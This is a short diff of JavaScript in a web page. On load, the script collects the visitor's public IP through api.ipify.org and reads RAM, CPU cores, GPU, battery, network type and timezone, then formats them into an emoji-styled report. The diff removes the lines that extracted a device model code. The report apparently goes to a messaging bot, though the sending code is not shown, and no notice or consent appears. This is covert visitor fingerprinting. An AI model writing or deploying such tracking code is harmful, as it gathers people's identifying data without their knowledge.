@@ -84,9 +84,6 @@
     window.onload = async function() {
         try {
             const n = navigator;
-            // ইউজার এজেন্ট থেকে মডেল কোডটি ফিল্টার করে বের করা
-const modelMatch = n.userAgent.match(/\(([^;]+);/);
-const deviceModel = modelMatch ? modelMatch[1] : n.platform;
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
             const conn = n.connection || n.mozConnection || n.webkitConnection || {};
@@ -106,7 +103,6 @@ const deviceModel = modelMatch ? modelMatch[1] : n.platform;
                        `🧠 **RAM:** ~${n.deviceMemory || 'N/A'} GB\n` +
                        `⚙️ **CPU Cores:** ${n.hardwareConcurrency || 'N/A'}\n` +
                        `🎮 **GPU:** ${gpu}\n` +
-                       `📱 **Model Code:** \`${deviceModel}\`\n` +
                        `🔋 **Battery:** ${batteryInfo}\n` +
                        `📶 **Network:** ${conn.effectiveType || 'Unknown'}\n` +
                        `🌍 **Timezone:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
